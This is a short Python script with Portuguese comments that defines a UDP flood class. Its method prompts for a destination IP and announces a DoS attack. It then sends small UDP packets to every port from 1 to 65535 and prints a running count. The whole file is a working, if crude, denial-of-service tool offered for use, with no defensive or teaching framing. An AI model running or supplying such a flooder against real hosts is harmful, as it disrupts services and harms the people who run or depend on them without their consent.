import socket
import random
import time
import sys

class udpflood: 

    def dos(self):
        # Criacao do socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #cria o socket
        bytes = random.randint(0, 65000).to_bytes(2, byteorder='big')  #cria o pacote
        print("Vamos fazer um ataque DOS")
        ip = input("IP de destino:")  
        sent = 0
        # Loop para envio de pacotes até parar a aplicacao
        try:
            for i in range(1, 65536):
                port = i
                sock.sendto(bytes, (ip, port))
                print("Enviado %s pacotes para %s no porto %s" % (sent, ip, port))
                sent = sent + 1
                time.sleep(0.0005)  # aguarda x segundos entre cada pacote
        except KeyboardInterrupt:
            print("Ciclo interrompido ")
            sys.exit()
        except socket.gaierror:
            print("Nao consigo resolver o dominio")
            sys.exit()
        except socket.error:
            print("Nao consigo chegar ao servidor")
            sys.exit()